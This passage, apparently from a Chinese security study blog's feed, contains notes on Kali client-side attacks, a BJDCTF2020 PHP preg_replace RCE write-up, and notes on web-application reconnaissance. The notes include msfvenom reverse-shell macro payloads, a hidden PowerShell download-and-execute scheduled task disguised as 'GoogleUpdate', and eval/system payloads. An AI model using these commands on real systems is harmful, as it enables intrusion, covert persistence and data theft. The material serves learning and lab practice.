class="hljs-builtin-name">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span><span class="hljs-builtin-name">set</span> lport<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-builtin-name">set</span> exitonsession <span class="hljs-literal">false</span><br>exploit -j -z<br></code></pre></div></td></tr></table></figure></li><li><p>创建脚本后，在终端使用以下命令运行脚本：<code>msfconsole -q -r nameofyourfile</code></p></li><li><p>之后打开文件即会在控制台生成一个反向shell</p></li><li><p>创建了一个Meterpreter会话，就可以通过输入<code>sessions -i 1</code>连接到具体的会话</p></li></ol><h1 id="2-使用恶意脚本攻击系统"><a href="#2-使用恶意脚本攻击系统" class="headerlink" title="2. 使用恶意脚本攻击系统"></a>2. 使用恶意脚本攻击系统</h1><p>客户端脚本如：JavaScript、VBScript、PowerShell，被开发用于应用程序逻辑和操作从服务器移动到客户端的计算机上。使用这些脚本有以下优势：</p><ol><li>大多数网站使用JavaScript作为主要的脚本语言</li><li>这些客户端脚本是目标原始操作环境的一部分</li><li>脚本语言设计的目的是便于计算机操作，如配置管理和系统管理等</li><li>因为它们原生于该操作系统环境，所以它们通常不会触发防病毒警报</li><li>它们很容易被使用，因为编写该脚本仅需要一个简单的文本编辑器</li></ol><p>JavaScript是用来发动攻击的首选脚本语言，因为JavaScript广泛用于大多数目标系统。由于JavaScript攻击的特点已经众所周知，我们将重点关注Kali如何使用更新的脚本语言：VBScript和PowerShell，使攻击变得容易</p><h2 id="2-1-使用VBScript进行攻击"><a href="#2-1-使用VBScript进行攻击" class="headerlink" title="2.1 使用VBScript进行攻击"></a>2.1 使用VBScript进行攻击</h2><p>可视化基本编辑脚本（Visual Basic Scripting，VBScript）是一个由微软开发的活动脚本语言（Active Scriptinglanguage），被默认按照在Windows的每个桌面版本中，在2018年8月，一个广为人知的高级持续性威胁（Advanced Persistent Threat，APT）利用了微软Windows中的VBScript引擎，它名为DarkHotel（DarkSeoul malware），利用的是IE11.0中的一个特定漏洞</p><p>使用VBScript发起攻击命令如下：<code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=IP lport=Port -e x86/shikata_ga_nai -f vba-exe</code></p><p>-f表示指定输出类型为VBA可执行文件，输出将显示两个特定部分的文本内容：</p><ol><li>The Macro. This must be copied into the Office document macro editor. This macro will run on startup(宏。必须将其复制到Office文档宏编辑器中。此宏将在启动时运行)</li><li>The Data. The hex dump at the end of this output must be appended to the end of the document contents( 数据。此输出末尾的十六进制转储必须附加到文档内容的末尾 )</li></ol><p>创建一个宏并复制内容到宏编译器中，之后复制shellcode到实际的文档中(此处最好进行各种方式隐藏混淆)</p><p>监听命令如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">use exploit/multi/handler<br>set host IP<br>set port Port<br>set payload windows/meterpreter/reverse_tcp<br>set autorunscript migrate -n explorer.exe<br>exploit<br></code></pre></div></td></tr></table></figure><p>扩展这种攻击方法可以使用/usr/share/metasploit-framework/tools/exploit下的exe2vba，/usr/share/metasploit-framework/tools/exploit下的exe2vba</p><h2 id="2-2-使用Windows-PowerShell攻击系统"><a href="#2-2-使用Windows-PowerShell攻击系统" class="headerlink" title="2.2 使用Windows PowerShell攻击系统"></a>2.2 使用Windows PowerShell攻击系统</h2><p>PowerShell是在大多数基于Windows的现代操作系统中默认可用，且不能被删除</p><p>使用Metasploit框架的PowerShell Payload Web Delivery模块，该模块在目标系统上快速建立会话。该攻击不写入磁盘，因此几乎不可能触发客户端防病毒检测</p><p>发起攻击和可用模块选项如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211011104540.png" alt="Metasploit框架的模块选项"></p><p>在攻击完成前，需要为传入的Shell脚本这被一个监听器(URIPATH由Metasploit随机生成，确保已为监听器设置了正确的URIPATH)，创建监听器的命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set srvhost IP<br>set target 2<br>set payload windows/meterpreter/reverse_http<br>set lhost IP<br>set payload<br>exploit<br></code></pre></div></td></tr></table></figure><p>运行<code>msfconsole -q -r ./监听文件</code>将生成一个一行的PowerShell脚本，可嵌入文档或在目标上运行</p><blockquote><p>使用schtask命令让web_delivery持久稳定是可行的</p></blockquote><p>以下命令将创建一项预定任务：GoogleUpdate，其登录系统后将执行powershell.exe</p><p><code>schtasks /ru &quot;SYSTEM&quot; /create /tn GoogleUpdate /tr &quot;powershell -windowstyle hidden -nologo -noninteractive -ep -bypass -nop -c &#39;IEX((new-object net.webclient).DownloadString(&#39;&#39;http://IP:Port/random&#39;&#39;&#39;))&#39;&quot; /sc onlogon</code> </p><p>经过尝试无法获得目标机的反弹shell，原因暂时不清楚，且之后的命令注入也不行。。。。(暂时跳过进行下一个尝试)</p><h1 id="3-跨站点脚本框架"><a href="#3-跨站点脚本框架" class="headerlink" title="3. 跨站点脚本框架"></a>3. 跨站点脚本框架</h1><p>即XSS(Cross-Site Scripting)漏洞</p><p>XSS攻击涉及三个实体：攻击者、受害者、脆弱网站或Web应用程序。攻击产生的本质原因在于脆弱网站的一个HTML页面上有一个可以返回用户输入的脚本，而该脚本并不对用户的输入进行任何审查。这就使得攻击者可以在其中输入JavaScript代码，并由受害者的浏览器执行</p><p>至少有两种主要类型的XSS漏洞：非持久的和持久的</p><p>最常见的类型是非持久的或反映出的漏洞。当由客户端提供的数据被服务器直接使用并显示响应时，这些漏洞将会产生。此种漏洞的攻击，可以通过电子邮件，或第三方网站提供一个似乎值得信赖，但包含XSS攻击代码的URL而发生</p><p>持久的（存储）XSS漏洞出现在当攻击者提供的数据被服务器保存，然后在他们浏览网页的过程中，永久地显示在其信任的网页中时。这通常发生在网上留言板和博客中，这里允许用户发布HTML格式的消息。攻击者可以将恶意脚本放入网页，其对进入的用户是不可见的，但可以入侵受影响网页的访客</p><p>跨站点脚本框架(Cross-Site Scripting Framework，XSSF)是一个多平台的安全工具，其利用XSS漏洞在目标上创建通信通道，并支持以下攻击模块：</p><ul><li>对目标浏览器(指纹和以前访问的URL)、目标主机(检测虚拟机，获取系统信息，注册密钥和无线密钥)和内部网络进行侦察</li><li>发送弹出的警报消息到目标系统。这种简单的“攻击”可用来展示XSS漏洞，然而，更复杂的警报可以模拟登录提示和捕获用户的身份认证凭据</li><li>窃取cookie，使攻击者能够冒充目标</li><li>重定向目标来查看不同的网页。一个恶意的网页可以自动下载漏洞，并且利用到目标系统上</li><li>加载PDF文件或Java小程序到目标系统上，或者窃取数据，如从安卓移动设备中窃取SD卡的内容</li><li>发动Metasploit攻击，包括browser_autopwn，以及拒绝服务攻击</li><li>发动社会工程学攻击，其中包括自动完成盗窃、点击劫持（clickjacking）、假Flash更新、网络钓鱼和标签绑架等</li></ul><p>此外XSSF隧道（XSSF Tunnel）功能允许攻击者冒充受害者，使用他们的凭据浏览网页与会话</p><p>书中的安装包无法使用，暂时跳过进行下一个尝试</p><h1 id="4-浏览器利用框架——BeEF"><a href="#4-浏览器利用框架——BeEF" class="headerlink" title="4. 浏览器利用框架——BeEF"></a>4. 浏览器利用框架——BeEF</h1><p>BeEF(Browser Exploitation Framework)是一种攻击工具，专注于一个特定的客户端应用程序：Webbrowser</p><p>BeEF使用XSS注入或SQL注入，将JavaScript代码注入HTML代码种。这种攻击代码称为钩(hook)。破解是由浏览器执行钩时首先的。浏览器(僵尸)连接回BeEF应用程序，提供给浏览器JavaScript命令或模块</p><p>BeEF模块执行如下任务：</p><ul><li>指纹识别和破解的浏览器侦察(BeEF允许我们在同一客户端，以及在一个域内的多个客户端上钩住多个浏览器，并在利用和后期利用阶段管理它们)</li><li>指纹识别目标主机，包括存在的虚拟机</li><li>在客户端上监测软件(仅限IE)，并获得Program Files和Program Files（x86）目录里的目录列表</li><li>使用已破解系统的网络摄像头拍摄照片，这些照片在报告中有重要的影响</li><li>首先浏览器键击记录</li><li>使用ping扫描和指纹机制对网络设备进行网络侦察，并扫描开放端口</li><li>从Metasploit框架发动攻击</li><li>使用隧道代理扩展，利用已破解Web浏览器的安全权限，攻击内部网络</li></ul><p>由于BeEF是用Ruby编写的，它支持多种操作系统。且容易定制新模块以及扩展其功能</p><p><strong>配置BeEF</strong></p><p>BeEF默认安装在Kali发行版的/usr/share/beef-xss目录下<del>目前需要自行安装，命令<code>apt-get install beef-xss</code></del>。在默认情况下，BeEF没有集成到Metasploit框架中。要集成BeEF，则需要执行以下步骤：</p><ol><li><p>编辑位于/usr/share/beef-xss/config.yaml的主要配置文件</p> <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">metasploit:<br>enable:true<br></code></pre></div></td></tr></table></figure></li><li><p>编译位于/usr/share/beef-xss/extensions/metasploit/config.yml，为Metasploit框架编译路径行host、callback_host、os’custom’来包含自己的IP地址和位置</p></li><li></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>客户端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此 1</title>
    <link href="/2021/10/08/%E4%BF%A1%E5%AE%89/CTF/Web/%5BBJDCTF2020%5DZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-1/"/>
    <url>/2021/10/08/%E4%BF%A1%E5%AE%89/CTF/Web/%5BBJDCTF2020%5DZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-1/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此-1"><a href="#BJDCTF2020-ZJCTF，不过如此-1" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此 1"></a>[BJDCTF2020]ZJCTF，不过如此 1</h1><p>访问题目可以看到源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>显然需要使用伪协议进行绕过，首先将text使用data伪协议设置内容text=data://text/plain,I+have+a+dream</p><p>再利用filter伪协议读取next.php源码 file=php://filter/read=convert.base64-encode/resource=next.php</p><p>base64翻译后得到源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>核心部分是<code>reg_replace(         &#39;/(&#39; . $re . &#39;)/ei&#39;,         &#39;strtolower(&quot;\\1&quot;)&#39;,         $str     );</code></p><p>经过查询，当reg_replace第一个参数是<code>/(.*)/ei</code>时，执行第二个参数的内容，由于第二个参数已经固定，所以使用可变变量来执行。而且在get传输中.会变成_导致直接传入&amp;.*=${phpinfo()}会无法运行，此时传入应该为\S*=${phpinfo()}</p><p>此时已经可以执行所有的内容了，可以直接使用如下payload获取flag(注意不能在\S*=里面使用’,”会报错但是可以使用如下方法进行绕过)</p><p>\S*=${eval($_GET[cmd])}&amp;cmd=var_dump(scandir(‘.’));</p><p>获取flag的payload如下</p><p>/next.php?\S*=${eval($_GET[e])}&amp;e=system(‘cat /flag’);</p><p>按照题目思路的payload应该调用getFlag()后利用cmd参数来获取flag</p><p>/next.php?\S*=${getFlag()}&amp;cmd=var_dump(system(‘cat /flag’));</p><p>可变变量的理解！！！</p><p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">var_dump(phpinfo()); <span class="hljs-regexp">//</span> 结果：布尔 true<br>var_dump(strtolower(phpinfo()));<span class="hljs-regexp">//</span> 结果：字符串 <span class="hljs-string">&#x27;1&#x27;</span><br>var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="hljs-regexp">//</span> 结果：字符串<span class="hljs-string">&#x27;11&#x27;</span><br><br>var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="hljs-regexp">//</span> 结果：空字符串<span class="hljs-string">&#x27;&#x27;</span><br>var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>,<span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="hljs-regexp">//</span> 结果：空字符串<span class="hljs-string">&#x27;&#x27;</span><br>这里的<span class="hljs-string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>执行后相当于 strtolower(<span class="hljs-string">&quot;&#123;$&#123;1&#125;&#125;&quot;</span>) 又相当于 strtolower(<span class="hljs-string">&quot;&#123;null&#125;&quot;</span>) 又相当于 <span class="hljs-string">&#x27;&#x27;</span> 空字符串<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Web应用的利用</title>
    <link href="/2021/10/05/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E4%BA%8EWeb%E5%BA%94%E7%94%A8%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/2021/10/05/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E4%BA%8EWeb%E5%BA%94%E7%94%A8%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="基于Web应用的利用"><a href="#基于Web应用的利用" class="headerlink" title="基于Web应用的利用"></a>基于Web应用的利用</h1><p>本章中学习的内容如下：</p><ul><li>Web应用程序攻击方法</li><li>黑客攻击思维导图</li><li>漏洞扫描</li><li>特定应用程序的攻击</li><li>利用密码漏洞和Web服务漏洞</li><li>利用网络后门维持对目标系统的访问</li></ul><h1 id="1-Web应用程序攻击方法"><a href="#1-Web应用程序攻击方法" class="headerlink" title="1. Web应用程序攻击方法"></a>1. Web应用程序攻击方法</h1><p>Web应用程序入侵的方法</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_301" alt="Web应用攻击方法"></p><p>攻击方法分为六个阶段，具体解释如下：</p><ol><li>设定目标(set target)：设置正确的目标，关注特定的脆弱系统，根据杀链方法获得系统级访问</li><li>爬虫与枚举(spider and enumerate)：攻击者确定了Web应用程序的列表，深入挖掘特定的漏洞。利用多种方法将爬虫应用于各种网页，并发现与之相关的东西以方便在下一阶段收益</li><li>漏洞扫描(vulnerability scanning)：所有已知的漏洞都是从众所周知的漏洞数据库收集而来，这些数据库包含公开的漏洞或已知的常见安全错误配置</li><li>利用(exploitation)：该阶段利用已知或伪装的漏洞，包括应用程序的业务逻辑等</li><li>覆盖痕迹(cover track)：在这个阶段，攻击者尝试清除所有的攻击证据</li><li>维持访问(maintain access)：攻击者可以植入一个后门程序，或利用系统执行特权升级，或将系统作为一个僵尸来执行更聚焦的内部攻击，如：在共享的驱动器上传播勒索软件，或对于大型机构，将受害系统都添加到一个域，控制整个企业</li></ol><h1 id="2-思维导图"><a href="#2-思维导图" class="headerlink" title="2. 思维导图"></a>2. 思维导图</h1><p>从攻击者的角度来看Web应用</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_302" alt="Web应用黑客思维导图"></p><p>思维导图被分为两类：服务端漏洞和客户端漏洞。</p><p>这些漏洞通常由于以下原因产生：</p><ul><li>使用了旧的或未更新补丁的技术</li><li>新技术的安全配置不充分</li><li>代码编写未考虑安全性</li><li>人为因素：缺少技术的员工</li></ul><p>对服务端，攻击者通常可以发起以下攻击：</p><ul><li>Web应用防火墙入侵</li><li>注入攻击</li><li>远程代码执行</li><li>远程文件包含或本地文件包含</li><li>目录路径遍历</li><li>利用会话管理</li><li>利用系统或应用的逻辑漏洞</li><li>识别可以帮助攻击者执行专用攻击的其他相关信息</li></ul><p>客户端攻击倾向于利用客户端存在的漏洞，包括浏览器、应用程序或网络：</p><ul><li><p>Flash漏洞：Flash播放器漏洞(<a href="https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-6761/Adobe-Flash-Player.html">https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-6761/Adobe-Flash-Player.html</a>)</p></li><li><p>JavaScript漏洞和Java漏洞</p></li><li><p>DNS的钉扎或重新绑定漏洞。DNS重新绑定是一种基于DNS将恶意代码嵌入Web页面的攻击</p><p>  来自Web页面（JavaScript、Java和Flash）中的代码请求被绑定到它们源自的网站（参见同源策略）。DNS重新绑定攻击可以用来提高JavaScript恶意软件渗透私有网络的能力，并破坏浏览器的同源策略</p></li><li><p>非DNS的钉扎漏洞</p></li><li><p>脚本注入漏洞/跨站脚本攻击：反射、持久性（存储）和基于DNS的漏洞</p></li></ul><h1 id="3-Web应用的侦察"><a href="#3-Web应用的侦察" class="headerlink" title="3. Web应用的侦察"></a>3. Web应用的侦察</h1><p>Web应用以及其提供的服务是特别复杂的。通常情况下，交付给最终用户的服务使用的是多层架构的应用服务器和Web服务器，服务器面向互联网的公众开放，同时与中间件服务、后端服务器和位于网络上的数据库进行通信</p><p>测试过程中需要考虑引起复杂度上升的几个额外因素：</p><ul><li>网络架构，包括安全控制(防火墙、IDS/IPS和蜜罐)和配置(如负载均衡器)</li><li>主机网络服务系统的平台架构(硬件、操作系统和附加应用程序)</li><li>应用、中间件和终极数据库。可能采用不同的平台(UNIX或Windows)、供应商、编程语言，以及开源、商业和专用软件的组合、</li><li>认证和授权过程，包括在应用程序中保持会话状态的过程</li><li>管理应用程序和如何使用的基本业务逻辑</li><li>客户端与网络服务的交互与通信</li></ul><p>目前最广泛接受的是<strong>开放Web应用安全项目</strong>(Open Web Application Security Project，OWASP)(<a href="http://www.owasp.org),它列出了10大漏洞/">www.owasp.org),它列出了10大漏洞</a></p><p>针对一些特定于Web应用侦察的活动，需要强调以下几点内容:</p><ul><li>确定目标Web应用，以及它是如何托管的</li><li>枚举目标网站的目录结构和文件，包括确定是否在用一个内容管理系统(CMS)</li><li>确定身份认证和授权机制，并确定在与网络服务的交易中，如何维护会话的状态。这通常包括利用代理工具对cookies的分析和使用</li><li>枚举所有的表单，这些是用户输入数据以及与Web应用服务进行交互的主要手段</li><li>确定接受输入的其他区域，如：允许文件上传的页面，以及可接受的文件类型的任何限制</li><li>确定如何处理错误，以及由用户接受的实际错误信息</li></ul><p>尤其要确保识别托管的网站，然后使用DNS映射来确定由相同的服务器提供服务的主机位置。攻击最常见和最成功的方法之一，就是攻击位于目标服务器同一物理位置的非目标主机网站，利用服务器的弱点来获得root权限，然后使用特权升级攻击目标网站</p><p>Web应用都托管在同一个软件即服务的模型上</p><h2 id="3-1-Web应用防火墙和负载均衡器检测"><a href="#3-1-Web应用防火墙和负载均衡器检测" class="headerlink" title="3.1 Web应用防火墙和负载均衡器检测"></a>3.1 Web应用防火墙和负载均衡器检测</h2><p>确定存在的基于网络的防护设备，如：防火墙、IDS/IPS和蜜罐技术。以及越来越普遍的防护设备是Web应用防火墙(Web Application Firewall，WAF)</p><p>WAF可能通过编码来绕过，WAF可通过手动检查cookie，或通过报头信息该改变来识别</p><p>WAF检测可以通过nmap的脚本http-waf-detect.nse来实现</p><p><code>nmap -p 80 --script http-waf-detect.nse URL/IP</code></p><p>wafw00f脚本是一个自动化的工具，可以识别和提取基于网络的防火墙指纹，测试已证明它是用于此目的最准确的工具。</p><p>使用命令<code>wafw00f URL/IP</code></p><p><strong>负载均衡器</strong>(Load Balancing Detector，LBD)是一个bash shell脚本，确定给定的域是否使用了DNS或HTTP负载均衡。由于负载均衡器将请求转换到不同的服务器，所以是否使用是一个重要的元素</p><p>lbd采用了多种检查来识别负载均衡的存在</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211008094732.png" alt="lbd示例"></p><h2 id="3-2-指纹识别Web应用和CMS"><a href="#3-2-指纹识别Web应用和CMS" class="headerlink" title="3.2 指纹识别Web应用和CMS"></a>3.2 指纹识别Web应用和CMS</h2><p>Web应用指纹识别是渗透测试人员了解运行的Web服务器、实现的Web技术版本和类型的第一项任务，这些会让攻击者确定已知的漏洞并适当利用</p><p>使用连接远程主机的命令行工具，可以得到HTTP服务器响应，可能包含应用程序的Web服务器类型，server部分提供了应用构建技术的详细信息。获取信息后可以使用CVE Details(<a href="https://www.cvedetails.com/vulnerabilit-list/vendor_id-74/product_id-128/PHP-PHP.html)%E7%AD%89%E8%B5%84%E6%BA%90%E7%A1%AE%E5%AE%9A%E5%B7%B2%E7%9F%A5%E7%9A%84%E6%BC%8F%E6%B4%9E">https://www.cvedetails.com/vulnerabilit-list/vendor_id-74/product_id-128/PHP-PHP.html)等资源确定已知的漏洞</a></p><p>渗透测试的最终目标是获取敏感信息，网站应进行检查以确定用于构建和维护的CMS</p><p>Kali中包括一个自动扫描器——BlindElephant，用于提取CMS指纹来确定版本信息</p><p><code>BlindElephant.py &lt;URL/IP&gt; joomla</code></p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_308" alt="BlindElephant示例"></p><p>BlindElephant检查CMS组件的指纹，然后为当前的版本提供一个最好的猜测。然而，与其他的应用一样，它可能无法检测CMS</p><p>自动化网络爬虫，可用来验证已收集的信息，以及确定特定网站现有的目录和文件结构</p><p>Kali支持多种网络爬虫包括Free Burp Suite、DirBuster、OWASP-ZAP、Vega、WebScarab和WebSlayer。最常用的工具是DirBuster</p><p>DirBuster是图形用户界面驱动的，使用可能的目录和文件列表，对网站的结构进行暴力分析的应用程序。可以以表或树的格式查看响应，并且能准确地反映网站的结构，此处需要自己提供目录字典进行扫描</p><h2 id="3-3-设置镜像网站"><a href="#3-3-设置镜像网站" class="headerlink" title="3.3 设置镜像网站"></a>3.3 设置镜像网站</h2><p>克隆或下载所有可用的本地网站信息，是基本的步骤</p><p>Kali提供了一个内置的应用httrack，可将网站内容下载到本地系统<code>httrack URL/IP -O /root/chap7</code></p><p>当httrack执行完成，测试人员就能够在本地加载应用程序并获取信息、识别实现缺陷</p><h1 id="4-客户端代理"><a href="#4-客户端代理" class="headerlink" title="4. 客户端代理"></a>4. 客户端代理</h1><p>客户端代理截获HTTP和HTTPS流量，允许渗透测试人员检查用户与应用程序之间的通信。它允许测试人员复制数据或与发送到应用的请求进行交互</p><p>Kali带有几个客户端代理，包括Burp Suite、OWASP ZAP、Paros、ProxyStrike、漏洞扫描器Vega和WebScarab。经过广泛的测试，我们已经开始依赖Burp代理，将ZAP作为一种备份工具，本章中将会介绍Burp使用<del>Brup的内容之前学习过的跳过</del></p><h2 id="4-2-Web抓取和目录的暴力破解"><a href="#4-2-Web抓取和目录的暴力破解" class="headerlink" title="4.2 Web抓取和目录的暴力破解"></a>4.2 Web抓取和目录的暴力破解</h2><p>Web抓取是一种使用机器人或自动化脚本从网站获取特定信息的过程</p><p>Kali为执行此活动提供了内置的应用程序</p><p>攻击者可以利用WebSploit来执行Web扫描、抓取和分析。例如，为了在多个站点上识别phpmyadmin，攻击者可以通过在终端上运行WebSploit来配置WebSploit模块，输入use web/pma，使用set target victim来设置目标主机，运行后如图所示</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_317" alt="示例"></p><p>还可以使用OWASP、DirBuster和其他工具来执行相同的操作</p><h2 id="4-3-网络服务专用漏洞扫描器"><a href="#4-3-网络服务专用漏洞扫描器" class="headerlink" title="4.3 网络服务专用漏洞扫描器"></a>4.3 